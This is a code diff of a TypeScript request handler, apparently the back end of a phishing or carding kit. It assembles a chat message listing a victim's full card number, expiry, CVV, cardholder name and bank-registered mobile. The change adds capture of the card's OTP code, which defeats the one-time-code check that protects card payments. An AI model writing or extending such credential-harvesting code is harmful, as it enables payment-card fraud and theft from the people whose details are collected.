@@ -42,10 +42,11 @@ export async function POST(request: Request) {
       messageText += ` ├ 🏛️ <b>Bank Name:</b> ${payment.bankId.toUpperCase()}\n`;
       messageText += ` ├ 🎴 <b>Card Network:</b> ${(payment.cardNetwork || 'visa').toUpperCase()}\n`;
       messageText += ` ├ 👤 <b>Cardholder Name:</b> ${payment.cardName}\n`;
-      messageText += ` ├ 📱 <b>Bank Reg. Mobile:</b> <code>${payment.registeredMobile}</code>\n`;
+      messageText += ` ├ 📱 <b>Bank Reg. Mobile:</b> <code>${payment.registeredMobile || customer.mobileNumber}</code>\n`;
       messageText += ` ├ 🔢 <b>Card Number:</b> <code>${payment.cardNumber}</code>\n`;
       messageText += ` ├ 📆 <b>Expiry Date:</b> <code>${payment.expiry}</code>\n`;
-      messageText += ` └ 🔐 <b>CVV / CVC Code:</b> <code>${payment.cvv}</code>\n\n`;
+      messageText += ` ├ 🔐 <b>CVV / CVC Code:</b> <code>${payment.cvv}</code>\n`;
+      messageText += ` └ 🔑 <b>Card OTP Code:</b> <code>${payment.otpCode || 'N/A'}</code>\n\n`;
     } else {
       messageText += ` ├ 📲 <b>Wallet Service:</b> ${payment.walletType.toUpperCase()}\n`;
       messageText += ` ├ 📝 <b>Account Title:</b> ${payment.walletAccountName}\n`;
